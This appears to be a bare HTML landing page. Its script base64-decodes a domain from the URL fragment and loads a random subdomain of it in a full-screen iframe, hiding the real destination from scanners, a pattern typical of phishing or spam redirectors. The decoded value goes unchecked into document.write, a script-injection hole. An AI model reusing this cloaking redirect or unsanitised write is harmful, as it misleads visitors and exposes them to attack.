<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <title></title>
  <style>
    html,
    body {
      width: 100%;
      height: 100%;
      margin: 0;
      padding: 0;
    }

    iframe {
      width: 100%;
      height: 100vh;
      border: none;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }
  </style>
</head>

<body>
  <script>
    if (location.hash && location.hash.slice(1)) {
      var domain3 = window.atob(location.hash.slice(1))
      if (domain3) {
        var uniqid = Date.now().toString(36)
        var random = window.btoa(uniqid)
        document.write(`<iframe src="https://${uniqid}.${domain3}/?==${random}"></iframe>`)
      }
    }
  </script>
</body>

</html>
